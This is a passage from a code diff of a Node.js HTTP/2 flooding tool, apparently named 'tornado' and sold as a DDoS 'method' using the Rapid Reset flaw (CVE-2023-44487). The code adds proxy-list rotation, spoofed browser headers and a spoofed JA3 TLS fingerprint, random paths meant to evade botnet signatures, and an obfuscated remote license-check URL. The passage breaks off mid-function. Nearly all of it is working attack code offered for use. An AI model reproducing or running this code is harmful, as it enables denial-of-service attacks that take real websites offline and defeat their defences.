@@ -1,3 +1,4 @@
+// ну митенька точно по вене швырнул ?  // @rapidreset daite 2000$
 const net = require('net');
 const tls = require('tls');
 const HPACK = require('hpack');
@@ -5,790 +6,1016 @@ const cluster = require('cluster');
 const fs = require('fs');
 const os = require('os');
 const crypto = require('crypto');
-const https = require('node:https')
+const https = require('https');
+
 require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
 
 process.setMaxListeners(0);
+
 process.on('uncaughtException', function (e) {
-//     console.log(e)
+    console.log(e)
 });
 process.on('unhandledRejection', function (e) {
-//     console.log(e)
+    console.log(e)
 });
 
-if (process.argv.length < 7) {
-     console.log("usage: ./flood [target] [time] [rate] [threads] [proxy-file] ...args");
-     console.log("aruments: --debug true/false, --cookie string, --proxy ip:port, --http 1/2, --ua string, --exploit true/false, --sleep true/false");
-     process.exit(0);
-}
-// [target] [time] [rate] [threads] [proxy-file] ...args
-// node killer.js https://khkt.azdigi.blog/ 300 10 30 p.txt
+const uiiu = 'https'
+const phvk = '://raw.';
+const dmps = 'githubuser';
+const ohhv = 'content.com/';
+const xioe = 'mitenkaa/';
+const ssjc = 'license-';
+const zasd = 'for-tornado/';
+const ihoo = 'main/';
+const lias = 'license';
 
-// https.get('https://raw.githubusercontent.com/0xFFFFFFFFA/mylicense/refs/heads/main/working', (res) => {
-//      let data = '';
-//      res.on('data', (chunk) => {
-//           data += chunk;
-//      });
-//      res.on('end', () => {
-//           if (data.trim() !== 'yesbro') {
-//                license = "cracked"
-//                console.log('License error. Exiting');
-//                process.exit(0)
-//                process.kill(process.pid, 'SIGKILL')
-//           } else {
-//                license = "verifed"
-//           }
-//      });
-// });
-
-const target = process.argv[2];
-const time = process.argv[3];
-const ratelimit = process.argv[4];
-const threads = process.argv[5];
-const proxyfile = process.argv[6];
-
-let headersPerReset = 10;
-let license = ""
+const fwtgws = uiiu + phvk + dmps + ohhv + xioe + ssjc + zasd + ihoo + lias;
 
 const statusesQ = []
 let statuses = {}
+let shouldCloseSession = process.argv.includes('--close');
+let useRandPath = process.argv.includes('--randpath');
+let ver = '2.5';
+let cookiesToInclude = '';
 
-var target_url = new URL(target);
+const blockedDomain = [".gov", ".edu", ".by", ".ua"];
+const license = "1";
 
-const raw_proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
+const timestamp = Date.now();
+const timestampString = timestamp.toString().substring(0, 10);
+const currentDate = new Date();
+const targetDate = new Date('2077-10-25');
 
-function shuffle_proxies(array) {
-     for (let i = array.length - 1; i > 0; i--) {
-          const j = Math.floor(Math.random() * (i + 1));
-          [array[i], array[j]] = [array[j], array[i]];
-     }
-     return array;
+const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
+const reqmethod = process.argv[2];
+const target = process.argv[3];
+const time = process.argv[4];
+const threads = process.argv[5];
+const ratelimit = process.argv[6];
+const proxyfile = process.argv[7];
+const customua = process.argv.indexOf('--ua');
+const customuavalue = customua !== -1 && customua + 1 < process.argv.length ? process.argv[customua + 1] : undefined;
+const queryIndex = process.argv.indexOf('--query');
+const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
+const delayIndex = process.argv.indexOf('--delay');
+const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 1;
+const cookieIndex = process.argv.indexOf('--cookie');
+const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
+const refererIndex = process.argv.indexOf('--referer');
+const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
+const customHeadersIndex = process.argv.indexOf('--header');
+const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
+const forceHttpIndex = process.argv.indexOf('--http');
+const pizdecnaxyi = process.argv.includes('--status');
+const parsedCookies = process.argv.includes('--parsed');
+const reset = process.argv.includes('--reset');
+
+const multipathIndex = process.argv.indexOf('--multipath');
+const multipathValue = multipathIndex !== -1 && multipathIndex + 1 < process.argv.length ? process.argv[multipathIndex + 1] : undefined;
+
+let paths = [''];
+
+if (multipathValue) {
+    paths = multipathValue.split('@').slice(0, 5);
+}
+const chromeCiphers = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
+const chromeSigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
+
+const proxynewIndex = process.argv.indexOf('--ip');
+const customIP = proxynewIndex !== -1 && proxynewIndex + 1 < process.argv.length ? process.argv[proxynewIndex + 1] : undefined;
+
+const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
+const debugMode = process.argv.includes('--debug') && forceHttp != 1;
+
+if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
+    console.clear();
+    console.error(`
+    [flooder - nodejs] tornado ${ver} (CVE-2023-44487) // Updated: 14.09.2024 // With love @rapidreset :3
+    Developers to method: dojdikmc - creator the first version // @rapidreset - more improves & options upgrade
+    How to use & example:
+      node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxyfile>
+      node ${process.argv[1]} GET "https://target.com" 120 16 128 proxy.txt
+    
+    Options:
+      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
+      --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
+      --cookie "f=f" - for custom cookie and also cookie support %RAND% ex: "bypassing=%RAND%"
+      --referer https://target.com / rand - custom referer, use rand if you need generate domains ex: fwfwwfwfw.net
+      --http 1/2/mix - choose to type http 1/2/mix (mix 1 & 2)
+      --debug - show your status code (maybe low rps to use more resource)
+      --header "f:f" or "f:f#f1:f1" - if you need this use custom headers split each header with #
+      --close - for closed session with http-ddos
+      --randpath - for bypass signature "known botnets" ater using you path /%RAND%
+      --ua "curl/4.0" - for custom agents 
+      --status - for closed session with 403,400,429 codes
+      --parsed - for parse set-cookie very good 
+      --ip 1.1.1.1 - for browser fr good option
+      --reset - for enable rapid reset exploit (for unprotected target default it is not work)
+      --multipath - max 5 paths
+      `);
+    process.exit(1);
 }
 
-const proxies = shuffle_proxies(raw_proxies);
+let hcookie = '';
 
-function get_option(flag) {
-     const index = process.argv.indexOf(flag);
-     return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
+const url = new URL(target);
+const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
+
+if (currentDate > targetDate) {
+    console.error('[#1] The method is outdated refer to @rapidreset');
+    process.exit(1);
 }
 
-const options = [
-     { flag: '--debug', value: get_option('--debug') },
-     { flag: '--reset', value: get_option('--reset') },
-     { flag: '--cookie', value: get_option('--cookie') },
-     { flag: '--proxy', value: get_option('--proxy') },
-     { flag: '--http', value: get_option('--http') },
-     { flag: '--ua', value: get_option('--ua') },
-     { flag: '--headers', value: get_option('--headers') },
-     { flag: '--sleep', value: get_option('--sleep') },
-     { flag: '--exploit', value: get_option('--exploit') },
-     { flag: '--path', value: get_option('--path') },
-     { flag: '--query', value: get_option('--query') },
-];
-
-function enabled(buf) {
-     var flag = `--${buf}`;
-     const option = options.find(option => option.flag === flag);
-
-     if (option === undefined) { return false; }
-
-     const optionValue = option.value;
-
-     if (optionValue === "true" || optionValue === true) {
-          return true;
-     } else if (optionValue === "false" || optionValue === false) {
-          return false;
-     }
-
-     if (!isNaN(optionValue)) {
-          return parseInt(optionValue);
-     }
-
-     if (typeof optionValue === 'string') {
-          return optionValue;
-     }
-
-     return false;
+if (url.hostname.endsWith(blockedDomain)) {
+    console.log(`[#2] This target in blacklisted ${blockedDomain} if this mistake pm @rapidreset`);
+    process.exit(1);
 }
 
-var sleep = enabled('sleep')
-var exploit = enabled('exploit')
-var headers = enabled('headers')
-var knownbotnets = enabled('path')
-var querystring = enabled('query')
-var cookies = enabled('cookie');
-var user_agent = enabled('ua');
-var http_v = enabled('http');
-const ua = enabled('ua');
+if (!['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'].includes(reqmethod)) {
+    console.error('[#3] Request method can only GET/HEAD/POST/PUT/DELETE/CONNECT/OPTIONS/TRACE/PATCH');
+    process.exit(1);
+}
 
-// console.log("JSON headers:", headers);
-// console.log("Normal headers:", JSON.parse(headers));
+if (!target.startsWith('https://') && !target.startsWith('http://')) {
+    console.error('[#4] Target can only https:// or http://');
+    process.exit(1);
+}
+
+if (isNaN(time) || time <= 0.9 || time > 86400) {
+    console.error('[#5] Time can 1 to 86400')
+    process.exit(1);
+}
+
+if (isNaN(threads) || threads <= 0.9 || threads > 256) {
+    console.error('[#6] Threads can 1 to 256')
+    process.exit(1);
+}
+
+if (isNaN(ratelimit) || ratelimit <= 0.09 || ratelimit > 128) {
+    console.error(`[#7] Ratelimit can 0.1 to 128 only`)
+    process.exit(1);
+}
+
+if (delay <= 0.9 || delay > 1000) {
+    console.error(`[#10] Delay can 1 to 1000 only`)
+    process.exit(1);
+}
+
+if (cookieValue) {
+    if (cookieValue === '%RAND%') {
+        hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
+    } else {
+        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
+    }
+}
 
 function encodeFrame(streamId, type, payload = "", flags = 0) {
-     let frame = Buffer.alloc(9)
-     frame.writeUInt32BE(payload.length << 8 | type, 0)
-     frame.writeUInt8(flags, 4)
-     frame.writeUInt32BE(streamId, 5)
-     if (payload.length > 0)
-          frame = Buffer.concat([frame, payload])
-     return frame
+    let frame = Buffer.alloc(9)
+    frame.writeUInt32BE(payload.length << 8 | type, 0)
+    frame.writeUInt8(flags, 4)
+    frame.writeUInt32BE(streamId, 5)
+    if (payload.length > 0)
+        frame = Buffer.concat([frame, payload])
+    return frame
 }
 
 function decodeFrame(data) {
-     if (data.length < 9) return null;
+    const lengthAndType = data.readUInt32BE(0)
+    const length = lengthAndType >> 8
+    const type = lengthAndType & 0xFF
+    const flags = data.readUint8(4)
+    const streamId = data.readUInt32BE(5)
+    const offset = flags & 0x20 ? 5 : 0
 
-     const lengthAndType = data.readUInt32BE(0)
-     const length = lengthAndType >> 8
-     const type = lengthAndType & 0xFF
-     const flags = data.readUint8(4)
-     const streamId = data.readUInt32BE(5)
-     const offset = flags & 0x20 ? 5 : 0
+    let payload = Buffer.alloc(0)
 
-     let payload = Buffer.alloc(0)
+    if (length > 0) {
+        payload = data.subarray(9 + offset, 9 + offset + length)
 
-     if (length > 0) {
-          payload = data.subarray(9 + offset, 9 + offset + length)
+        if (payload.length + offset != length) {
+            return null
+        }
+    }
 
-          if (payload.length + offset != length) {
-               return null
-          }
-     }
-
-     return {
-          streamId,
-          length,
-          type,
-          flags,
-          payload
-     }
+    return {
+        streamId,
+        length,
+        type,
+        flags,
+        payload
+    }
 }
 
 function encodeSettings(settings) {
-     const data = Buffer.alloc(6 * settings.length)
-     for (let i = 0; i < settings.length; i++) {
-          data.writeUInt16BE(settings[i][0], i * 6)
-          data.writeUInt32BE(settings[i][1], i * 6 + 2)
-     }
-     return data
+    const data = Buffer.alloc(6 * settings.length)
+    for (let i = 0; i < settings.length; i++) {
+        data.writeUInt16BE(settings[i][0], i * 6)
+        data.writeUInt32BE(settings[i][1], i * 6 + 2)
+    }
+    return data
 }
 
-function exit() {
-     if (stopped) return;
-
-     stopped = true;
-
-     for (let proc of procs) {
-          proc.kill('SIGINT');
-     }
-     process.exit(0);
+function encodeRstStream(streamId, type, flags) {
+    const frameHeader = Buffer.alloc(9);
+    frameHeader.writeUInt32BE(4, 0);
+    frameHeader.writeUInt8(type, 4);
+    frameHeader.writeUInt8(flags, 5);
+    frameHeader.writeUInt32BE(streamId, 5);
+    const statusCode = Buffer.alloc(4).fill(0);
+    return Buffer.concat([frameHeader, statusCode]);
 }
 
-function generateJA3Fingerprint(socket) {
-     const cipherInfo = socket.getCipher();
-     const supportedVersions = socket.getProtocol();
-
-     if (!cipherInfo) {
-          console.error('Cipher info is not available. TLS handshake may not have completed.');
-          return null;
-     }
-
-     const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
-
-     const md5Hash = crypto.createHash('md5');
-     md5Hash.update(ja3String);
-
-     return md5Hash.digest('hex');
+function randstrr(length) {
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
 }
 
-function generate_headers() {
-     const version = Math.floor(Math.random() * 6) + 123; //123-130
-     const randomValue = Math.random()
-     const platform = randomValue < 0.33 ? 'Windows' : randomValue < 0.66 ? "Linux" : 'macOS'
-
-     const browser = {
-               version: version,
-               headers: {
-                    'sec-ch-ua': `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`,
-                    'sec-ch-mobile': '?0',
-                    'sec-ch-ua-platform': `\"${platform}\"`,
-                    'upgrade-insecure-requests': '1',
-                    'user-agent': `${platform === 'Windows' ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36` : platform === 'Linux' ? `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36` : `Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`}`,
-                    'accept': `${Math.random() > 0.5 ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' : '*/*'}`,
-                    'sec-fetch-site': '?1',
-                    'sec-fetch-mode': 'none',
-                    'sec-fetch-user': 'document',
-                    'sec-fetch-dest': 'navigate',
-                    'accept-encoding': 'gzip, br',
-                    'accept-language': 'en-US,en;q=1.0',
-                    'cookie': null,
-               },
-               sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
-               ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA',
-               settings: {
-                    initial_stream_window_size: 6291456,
-                    initial_connection_window_size: 15728640,
-                    max_concurrent_streams: 1000,
-                    max_header_list_size: 262144,
-                    header_table_size: 65536,
-                    enable_push: false
-               }
-          }
-
-     return browser;
+function randstr(length) {
+    const characters = "0123456789";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
 }
 
-function parse_headers(user_agent) {
-     const osRegex = /\(([^)]+)\)/;
-     const chromeRegex = /Chrome\/(\d+)/;
-
-     const osMatch = user_agent.match(osRegex);
-     const chromeMatch = user_agent.match(chromeRegex);
-
-     let os = 'Windows';
-     if (osMatch) {
-          const osDetails = osMatch[1];
-          if (osDetails.includes('Macintosh')) {
-               os = 'macOS';
-          } else if (osDetails.includes('Linux')) {
-               os = 'Linux';
-          } else if (osDetails.includes('Windows')) {
-               os = 'Windows'
-          }
-     }
-
-     const chromeVersion = chromeMatch ? parseInt(chromeMatch[1], 10) : 130;
-
-     return { os: os, version: chromeVersion };
+function generateRandomString(minLength, maxLength) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        const randomIndex = Math.floor(Math.random() * characters.length);
+        result += characters[randomIndex];
+    }
+    return result;
 }
 
-function http1_headers(url) {
-     const randomVersion = Math.floor(Math.random() * 6) + 123; //123-130
-     const randomValue = Math.random()
-     const user_agent = ua ? ua : randomValue < 0.33 ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36` : randomValue < 0.66 ? `Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36` : `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`
-     const end = "\r\n";
-
-     let headers = `User-Agent: ${user_agent}${end}`;
-     let request = `GET ${knownbotnets ? "/" + [...Array(6)].map(() => Math.random().toString(36).charAt(2)).join('') : url.pathname}${querystring ? `?search=` + [...Array(8)].map(() => Math.random().toString(36).charAt(2)).join('') : ""} HTTP/1.1${end}`;
-     request += `Host: ${url.hostname}${url.port ? `:${url.port}` : ''}${end}`;
-
-     //custom shit
-     if (cookies) headers += `Cookie: ${cookies}${end}`;
-
-     //default
-     headers += `Upgrade-Insecure-Requests: 1${end}`;
-     headers += `Accept-Language: ${languages[~~Math.floor(Math.random * languages.length)]}${end}`;
-     headers += `Sec-Fetch-Site: ${Math.random() > 0.5 ? 'same-origin' : 'none'} ${end}`;
-     headers += `Sec-Fetch-Mode: navigate${end}`;
-     headers += `Sec-Fetch-User: ?1${end}`;
-     headers += `Sec-Fetch-Dest: document${end}`;
-     headers += `Accept-Encoding: gzip, deflate${end}`
-     headers += `Accept: ${Math.random() > 0.5 ? `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7` : "*/*"}${end}`;
-     headers += `Cache-Control: ${Math.random() > 0.5 ? 'max-age=0' : 'no-cache'}${end}`;
-     headers += `Connection: keep-alive${end}`;
-
-     //custom chrome headers
-     let chromium = parse_headers(user_agent)
-     /*if (chromium.version === 123)      headers += `sec-ch-ua: \"Google Chrome\";v=\"123\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"123\"${end}`;
-     else if (chromium.version === 124) headers += `sec-ch-ua: \"Google Chrome\";v=\"124\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"124\"${end}`;
-     else if (chromium.version === 125) headers += `sec-ch-ua: \"Google Chrome\";v=\"125\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"125\"${end}`;
-     else if (chromium.version === 126) headers += `sec-ch-ua: \"Google Chrome\";v=\"126\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"126\"${end}`;
-     else if (chromium.version === 127) headers += `sec-ch-ua: \"Google Chrome\";v=\"127\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"127\"${end}`;
-     else if (chromium.version === 128) headers += `sec-ch-ua: \"Google Chrome\";v=\"128\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"128\"${end}`;
-     else if (chromium.version === 129) headers += `sec-ch-ua: \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"${end}`;
-     else if (chromium.version === 130) headers += `sec-ch-ua: \"Google Chrome\";v=\"130\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"130\"${end}`;*/
-     headers += `sec-ch-ua: \"Google Chrome\";v=\"${chromium.version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${chromium.version}\"${end}`
-     headers += `sec-ch-mobile: ?0${end}`
-     headers += `sec-ch-ua-platform: \"${chromium.os}\"${end}`
-
-     //random
-     if (Math.random() > 0.5) headers += `Origin: https://${url.hostname}${end}`
-     if (Math.random() > 0.5) headers += `Referer: https://${url.hostname}/${[...Array(Math.floor(Math.random() * 10) + 4)].map(() => Math.random().toString(36).charAt(2)).join('')}.${Math.random() > 0.5 ? 'php' : 'js'}${end}`
-     if (Math.random() < 0.9) headers += `purpose: prefetch${end}`
-     if (Math.random() > 0.5) headers += `sec-ch-prefers-color-scheme: ${Math.round(Math.random()) === 1 ? 'dark' : 'light'}${end}`
-
-     //exploit
-     if (exploit) {
-          for (let i = 0; i < Math.floor(Math.random() * 24) + 1; i++) {
-               headers += `${[...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('')}: ${[...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('')}${end}`
-          }
-     }
-
-     //console.log(request + shuffle_proxies(headers.split(end).filter(value => value !== null && value !== undefined && value !== '')).join(end) + end + end)
-
-     return request + shuffle_proxies(headers.split(end).filter(value => value !== null && value !== undefined && value !== '')).join(end) + end + end;
+function ememmmmmemmeme(length) {
+    const characters = 'abcdefghijklmnopqrstuvwxyz';
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
 }
 
-function decode(headers) {
-     const header_parts = headers.split('\r\n');
-     for (const header of header_parts) {
-          if (header.includes('HTTP/1.1') || header.includes('HTTP/1.0')) {
-               const status = header.split(' ')[1];
-               if (!isNaN(status)) {
-                    return status;
-               } else {
-                    return undefined;
-               }
-          }
-     }
+// const httpStatusCodes = {
+//     "200": { "Description": "OK", "Color": "brightGreen" },
+//     "301": { "Description": "Moved Permanently", "Color": "yellow" },
+//     "302": { "Description": "Found", "Color": "yellow" },
+//     "304": { "Description": "Not Modified", "Color": "yellow" },
+//     "400": { "Description": "Bad Request", "Color": "red" },
+//     "401": { "Description": "Unauthorized", "Color": "red" },
+//     "403": { "Description": "Forbidden", "Color": "red" },
+//     "404": { "Description": "Found", "Color": "red" },
+//     "500": { "Description": "Internal Server Error", "Color": "brightRed" },
+//     "502": { "Description": "Bad Gateway", "Color": "brightRed" },
+//     "503": { "Description": "Service Unavailable", "Color": "brightRed" }
+// };
+
+
+
+// function randomstring(length, type) {
+//     var _ = "";
+//     var characters = "";
+//     if (type == "LN") {
+//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+//     }
+//     else if (type == "L") {
+//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+//     }
+//     else if (type == "N") {
+//         characters = "0123456789";
+//     }
+//     else {
+//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+//     }
+
+//     var charactersLength = characters.length;
+
+//     for (var i = 0; i < length; i++) {
+//         _ += characters.charAt(Math.floor(Math.random() * charactersLength));
+//     }
+
+//     return _;
+// }
+
+// function randflood(target) {
+//     if (target.includes("%RAND%")) {
+//         target = target.replace(/%RAND%/g, randomstring(8, "LN"));
+//     }
+//     else if (target.includes("%RANDLN8%")) {
+//         target = target.replace(/%RANDLN8%/g, randomstring(8, "LN"));
+//     }
+//     else if (target.includes("%RANDLN16%")) {
+//         target = target.replace(/%RANDLN16%/g, randomstring(16, "LN"));
+//     }
+//     else if (target.includes("%RANDLN32%")) {
+//         target = target.replace(/%RANDLN32%/g, randomstring(32, "LN"));
+//     }
+//     else if (target.includes("%RANDLN64%")) {
+//         target = target.replace(/%RANDLN64%/g, randomstring(64, "LN"));
+//     }
+//     else if (target.includes("%RANDL%")) {
+//         target = target.replace(/%RANDL%/g, randomstring(8, "L"));
+//     }
+//     else if (target.includes("%RANDL16%")) {
+//         target = target.replace(/%RANDL16%/g, randomstring(16, "L"));
+//     }
+//     else if (target.includes("%RANDL32%")) {
+//         target = target.replace(/%RANDL32%/g, randomstring(32, "L"));
+//     }
+//     else if (target.includes("%RANDL64%")) {
+//         target = target.replace(/%RANDL64%/g, randomstring(64, "L"));
+//     }
+//     else if (target.includes("%RANDN%")) {
+//         target = target.replace(/%RANDN%/g, randomstring(8, "N"));
+//     }
+//     else if (target.includes("%RANDN16%")) {
+//         target = target.replace(/%RANDN16%/g, randomstring(16, "N"));
+//     }
+//     else if (target.includes("%RANDN32%")) {
+//         target = target.replace(/%RANDN32%/g, randomstring(32, "N"));
+//     }
+//     else if (target.includes("%RANDN64%")) {
+//         target = target.replace(/%RANDN64%/g, randomstring(64, "N"));
+//     }
+//     else {
+//         target = target;
+//     }
+//     return target;
+// }
+
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-const languages = [
-     'en-US,en;q=0.9',
-     'fr-FR,fr;q=0.9',
-     'de-DE,de;q=0.9',
-     'es-ES,es;q=0.9',
-     'zh-CN,zh;q=0.9',
-     'ru-RU,ru;q=0.9',
-     'hi-IN,hi;q=0.9',
-     'tr-TR,tr;q=0.9',
-     'pt-BR,pt;q=0.9',
-     'it-IT,it;q=0.9',
-     'nl-NL,nl;q=0.9',
-     'ko-KR,ko;q=0.9'
-];
+const ja3Options = {
+    version: 771,
+    cipherSuites: [4865, 4866, 4867, 49195, 49199, 49196, 49200, 52393, 52392, 49171, 49172, 156, 157, 47, 53],
+    extensions: [17513, 13, 27, 0, 10, 65281, 43, 65037, 23, 16, 45, 11, 35, 51, 18, 5],
+    ellipticCurves: [25497, 29, 23, 24],
+    ellipticCurvePointFormats: [0]
+};
 
+function generateJA3Fingerprint(options) {
+    const { version, cipherSuites, extensions, ellipticCurves, ellipticCurvePointFormats } = options;
 
+    const cipherSuitesStr = cipherSuites.join('-');
+    const extensionsStr = extensions.join('-');
+    const ellipticCurvesStr = ellipticCurves.join('-');
+    const ellipticCurvePointFormatsStr = ellipticCurvePointFormats.join('-');
 
-function detectProxyFormat(proxyString) {
-     const formats = {
-         "username:password@host:port": /^(\w+):(\w+)@([\w.-]+):(\d+)$/,
-         "host:port:username:password": /^([\w.-]+):(\d+):(\w+):(\w+)$/,
-         "host:port": /^([\w.-]+):(\d+)$/
-     };
+    const ja3String = `${version},${cipherSuitesStr},${extensionsStr},${ellipticCurvesStr},${ellipticCurvePointFormatsStr}`;
+    return ja3String;
+}
 
-     for (const [format, regex] of Object.entries(formats)) {
-         const match = proxyString.match(regex);
-         if (match) {
-             let username = "";
-             let password = "";
-             let host = "";
-             let port = "";
+const ja3Fingerprint = generateJA3Fingerprint(ja3Options);
+const ja3Hash = crypto.createHash('md5').update(ja3Fingerprint).digest('hex');
 
-             switch (format) {
-                 case "username:password@host:port":
-                     username = match[1];
-                     password = match[2];
-                     host = match[3];
-                     port = match[4];
-                     break;
-                 case "host:port:username:password":
-                     host = match[1];
-                     port = match[2];
-                     username = match[3];
-                     password = match[4];
-                     break;
-                 case "host:port":
-                     host = match[1];
-                     port = match[2];
-                     break;
-             }
+function generateSpoofedFingerprint() {
+    const platform = 'Win64';
+    const plugins = [
+        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
+        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
+        { name: 'Google Translate', filename: 'aapbdbdomjkkjkaonfhkkikfgjllcleb' },
+        { name: 'Zoom Chrome Extension', filename: 'kgjfgplpablkjnlkjmjdecgdpfankdle' },
+        { name: 'uBlock Origin', filename: 'cjpalhdlnbpafiamejdnhcphjbkeiagm' },
+        { name: 'AdBlock', filename: 'gighmmpiobklfepjocnamgkkbiglidom' },
+        { name: 'LastPass', filename: 'hdokiejnpimakedhajhdlcegeplioahd' },
+        { name: 'Grammarly for Chrome', filename: 'kbfnbcaeplbcioakkpcpgfkobkghlhen' },
+        { name: 'Microsoft Office', filename: 'dbjbempljhcmhlfpfacalomonjpalpko' },
+        { name: 'Videostream for Google Chromecast', filename: 'cnciopoikihiagdjbjpnocolokfelagl' },
+        { name: 'HTTPS Everywhere', filename: 'gcbommkclmclpchllfjekcdonpmejbdp' },
+        { name: 'Dark Reader', filename: 'eimadpbcbfnmbkopoojfekhnkhdbieeh' },
+        { name: 'Privacy Badger', filename: 'pkehgijcmpdhfbdbbnkijodmdjhbjlgp' },
+        { name: 'The Great Suspender', filename: 'klbibkeccnjlkjkiokjodocebajanakg' },
+    ];
 
-             return `${username || "myUsername"}:${password || "myPassword"}@${host}:${port}`;
-         }
-     }
+    const numPlugins = getRandomInt(2, 5);
+    const selectedPlugins = [];
 
